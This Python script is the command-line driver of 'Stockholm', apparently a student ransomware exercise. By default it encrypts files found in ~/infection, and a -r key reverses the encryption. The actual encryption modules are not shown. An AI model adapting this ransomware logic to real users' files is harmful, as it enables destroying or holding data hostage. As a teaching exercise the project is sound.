import argparse
from scanner import scan_encrypt, scan_decrypt
from encryptor import encrypt_dirs
from decryptor import decrypt_dirs
from getpass import getuser

# Variables del usuario
user_target = getuser()
user_dir = '/home/'+user_target
default_dir = '/home/'+user_target+'/infection'

# Main
def run():
    # Opciones de Flags
    args = config_args()
    # Evaluacion de Flags
    ## Infeccion de directorio
    if args.reverse == None and args.version == False:
        # Escaneo de Directorio
        res_encrypt = scan_encrypt(dir=default_dir,silent=args.silent)
        if len(res_encrypt) > 0:
            # Cifrado de Archivos
            encrypt_dirs(lst_dir=res_encrypt,silent=args.silent)
    if args.version == True:
        # Version del Programa
        print("Program version Stockholm-1.1 - lgomes-o")
    if args.reverse != None and args.version == False:
        # Escaneo de Directorio
        re_decrypt = scan_decrypt(dir=default_dir,silent=args.silent)
        if len(re_decrypt) > 0:
            # Descifrado de Archivos 
            decrypt_dirs(key=args.reverse,lst_dir=re_decrypt,silent=args.silent)

# Configuracion de Flags
def config_args():
    parser = argparse.ArgumentParser()
    # Reverse mode
    parser.add_argument("-r","--reverse",default=None,help="Reverse File Encryption.")
    # Silent mode
    parser.add_argument("-s","--silent",default=False,action='store_true',help="Silent mode, the program output is emitted.")
    # Version mode
    parser.add_argument("-v","--version",default=False,action='store_true',help="Program version.")
    return parser.parse_args()

# Main execution
if __name__ == "__main__":
    run()